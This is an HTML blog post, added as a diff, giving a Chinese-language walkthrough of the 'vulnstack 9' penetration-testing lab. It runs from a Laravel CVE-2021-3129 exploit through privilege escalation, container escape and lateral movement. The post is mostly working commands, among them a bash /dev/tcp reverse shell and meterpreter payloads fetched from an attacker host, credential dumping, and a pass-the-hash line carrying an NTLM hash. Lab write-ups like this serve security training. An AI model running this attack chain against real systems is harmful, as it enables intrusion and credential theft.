@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+        <head>
+        <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
+        <meta charset="utf-8">
+        <title>vulnstack 9 | 老白</title>
+        <link rel="stylesheet" href="https://V-alkoinen.github.io/styles/main.css">
+        <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
+        <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
+         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+        <script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+         <script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
+         <script >hljs.initHighlightingOnLoad();</script>
+
+    </head>
+    <body>
+              <header class="header mdui-m-b-5">      
+            <div class="container  ">
+                <div class="index-title animated fadeInDown mdui-text-center mdui-text-color-white mdui-m-b-2" style="animation-delay: 0.2s"><a href="https://V-alkoinen.github.io">老白</a></div>
+                <div class="mdui-text-color-white animated fadeInDown mdui-text-center  mdui-m-b-3" style="animation-delay: 0.4s"></div>
+           
+            <nav id="nav" class="mdui-text-center animated fadeInDown" style="animation-delay: 0.6s">
+                   
+                            <li><a href="/">首页</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/archives">归档</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/tags">标签</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                  </nav>
+                </div>
+        </header>
+        <div class="mdui-container ">
+                <div class="mdui-row">
+                        <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
+                                <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
+                                    <div class="post-title  mdui-m-b-1">vulnstack 9</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2022-03-03 20:25:20">2022-03-03 / 3 min read</div>
+                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="过程">过程</h1>
+<p> <code>nmap -T4 -Pn -sV -O 10.100.202.45</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1648816095419.png" alt="" loading="lazy"></p>
+<pre><code>http://10.100.202.45:81/ 
+laravel 8.29.0
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1648816131078.png" alt="" loading="lazy"></figure>
+<pre><code>POST /_ignition/execute-solution HTTP/1.1
+Host: 10.100.202.45:81
+Content-Type: application/json
+Content-Length: 168
+
+{
+  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,
+  &quot;parameters&quot;: {
+    &quot;variableName&quot;: &quot;username&quot;,
+    &quot;viewFile&quot;: &quot;xxxxxxx&quot;
+  }
+}
+</code></pre>
+<p> 确认存在CVE-2021-3129<br>
+<img src="https://V-alkoinen.github.io/post-images/1648816183045.png" alt="" loading="lazy"></p>
+<pre><code>网上找了个exp
+https://github.com/simonlee-hello/CVE-2021-3129
+微调了一下工具，可以rce
+git clone https://github.com/zhzyker/CVE-2021-3129
+python3 exp.py http://10.100.202.45:81/
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1648816220410.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1648816225211.png" alt="" loading="lazy"><br>
+ 看这个主机名像个容器<code>cat /proc/self/cgroup</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1648816260319.png" alt="" loading="lazy"></p>
+<pre><code>curl https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o 1.py
+python 1.py
+用suid进行提权，发现一个shell文件
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1648816544818.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1648816529464.png" alt="" loading="lazy"><br>
+ 运行该shell文件后发现是ps命令，于是尝试修改当前终端环境变量</p>
+<pre><code>echo '/bin/bash' &gt; ps
+chmod 777 ps
+echo $PATH
+export PATH=/tmp:$PATH
+./shell
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1648816688823.png" alt="" loading="lazy"><br>
+ 成功提权至root<br>
+ <code>git clone https://github.com/cdk-team/CDK</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1648816736634.png" alt="" loading="lazy"></p>
+<pre><code>python3 -m http.server 8080
+curl http://172.16.70.129:8080/cdk -o cdk
+./cdk run –list
+./cdk evaluate
+./cdk auto-escape &quot;bash -c 'bash -i &gt;&amp; /dev/tcp/172.16.70.129/10001 0&gt;&amp;1'&quot;
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1648816793200.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1648816798041.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1648816802287.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1648816806666.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1648816810797.png" alt="" loading="lazy"><br>
+ 拿到主机权限，稳定下shell</p>
+<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.16.70.129 LPORT=10001 -f elf &gt; shell-10001.elf
+curl http://172.16.70.129:8080/shell-10001.elf -o shell-10001.elf
+nohup ./shell-10001.elf &amp;
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1648816889824.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1648816894361.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1648816899235.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1648816903490.png" alt="" loading="lazy"><br>
+ 搞个ew做代理</p>
+<pre><code>curl http://172.16.70.129:8080/ew_for_linux -o ew
+chmod +x ew
+nohup ./ew -s ssocksd -l 10003 &amp;
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1648817112980.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1648817117504.png" alt="" loading="lazy"><br>
+ 使用fscan进行扫描</p>
+<pre><code>proxychains -q ./fscan_amd64 -h 192.168.93.10/24
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1648817214237.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1648817219235.png" alt="" loading="lazy"><br>
+ 发现一个通达oa，github上找了个exp</p>
+<pre><code>https://github.com/z1un/TongdaOA-exp
+curl https://raw.githubusercontent.com/z1un/TongdaOA-exp/master/TongdaOA.py -o tongda.py
+proxychains -q python3 tongda.py
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1648817319207.png" alt="" loading="lazy"><br>
+ 开冰蝎<br>
+<img src="https://V-alkoinen.github.io/post-images/1648817350087.png" alt="" loading="lazy"><br>
+ 上meterpreter</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.70.129 LPORT=44445 -f exe -o shell.exe
+certutil.exe -urlcache -split -f http://172.16.70.129:8080/shell.exe shhhhhhell.exe
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1648817527535.png" alt="" loading="lazy"><br>
+ 抓hash</p>
+<pre><code>load kiwi
+creds_all
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1648817588063.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1648817592626.png" alt="" loading="lazy"></p>
+<p> PTH</p>
+<pre><code>impacket-wmiexec -hashes :ab89b1295e69d353dd7614c7a3a80cec administrator@192.168.93.30
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1648817676390.png" alt="" loading="lazy"></figure>
+</div>
+                                    <div class="mdui-divider mdui-m-b-2"></div>
+                                    <div class="mdui-row-xs-2 post-fenye">
+                                       
+                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/cve-2022-0847-dirtypipe/">CVE-2022-0847 DirtyPipe</a></div></div>
+                                        
+
+                                        
+                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/win-brute/">Win-Brute</a></div> </div>
+                                       
+                                      </div>
+                                   
+                                    <div class="mdui-divider mdui-m-t-2 mdui-m-b-2"></div>
+                                    
+                                     <script src="https://V-alkoinen.github.io/media/scripts/Valine.min.js"></script>
+ <div class="comment"></div>
+
+<script>
+      new Valine({
+            el: '.comment',
+
+
+
+            path: window.location.pathname,
+            pageSize: 30,
+            avatar:'mm', 
+       })
+    </script> 
+<script>
+    if(window.location.hash){
+        var checkExist = setInterval(function() {
+           if ($(window.location.hash).length) {
+              $('html, body').animate({scrollTop: $(window.location.hash).offset().top-90}, 1000);
+              clearInterval(checkExist);
+           }
+        }, 100);
+    }
+</script>
+                                </article>
+
+                                    
+                        </div>
+                      </div>
+    
+                
+
+              </div>
+                    <footer class="footer mdui-m-t-5 mdui-text-center">
+               <nav class="social-links">
+                      <ul>
+                      
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      </ul>
+                    </nav>
+                    <div class="copyright">
+                      
+                  </div>
+                  
+              </footer>
+    </body>
+</html>
